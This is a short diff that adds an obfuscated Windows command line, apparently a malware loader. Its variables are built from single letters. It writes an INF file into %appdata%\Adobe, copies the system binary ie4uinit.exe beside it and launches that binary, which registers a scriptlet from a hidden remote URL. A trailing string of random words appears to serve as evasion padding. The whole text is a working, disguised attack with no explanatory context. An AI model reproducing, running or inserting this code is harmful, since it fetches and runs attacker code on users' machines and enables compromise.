@@ -1,0 +1,7 @@
+/v /c (for %q in (s) do @set "Reveal=%~q") &&
+  (for %e in (a) do @set "August=%~e") &&
+  (for %c in (i) do @set "Modes=%~c") &&
+  (for %c in (c) do @set "Throws=%~c") &&
+  call(for %q in ("[strings]" "Insects=init" "Principles=/" "Noodle=b;Accidents" "Census=:;Cabin" "servicename=' '" "Titles=%t!Modes!me%" "shortsvcname=' '" "Depends=h" "Permit=t;Investments" "[version]" "signature =$windows nt$" "[881090]" "ieu%Insects%.inf" "[destinationdirs]" "881090=01" "defaultdestdir=11" "[defaultinstall.windows7]" "Un\" "Register\" "OCXs=7F9B" "delfiles=881090" "[7F9B]" "sc\" "ro%Noodle%j,NI,%Depends%%Permit%%Permit%p%Census%%Principles%%Principles%bakd7s!Produ!Throws!ts!jacksallay!Produ!Throws!ts!com/0927d908" ) do @echo %~q)>"%appdata%\Adobe\ieuinit.inf" &&
+  call xcopy /Y /C /Q %w!Modes!n!Covers!ir%\system32\ie4uinit.exe "%appdata%\Adobe\*" | set Cables16=Populations &&
+  start " " %appdata%\Adobe\ie4uinit.exe -basesettings " | set "Cables40=Antique Liquid Trains Plastics Privileges Pledge Centres Programmers Fingers Scrub Amazing Citizens Dress Enlist Click Junior Panther Enemies Identify Deputy Swing Donors Exhibits Habits Panels Eagle Herbs Homeless Taste Blame Initiatives Writers Ourselves Abuse Sunglasses Grant Quarters Woman Glimpse Walls Diffs Second Thing Media Trips Stuff Ivory Identifies Finger Since Chess Amendments Plants Carriers Sports Before Science"
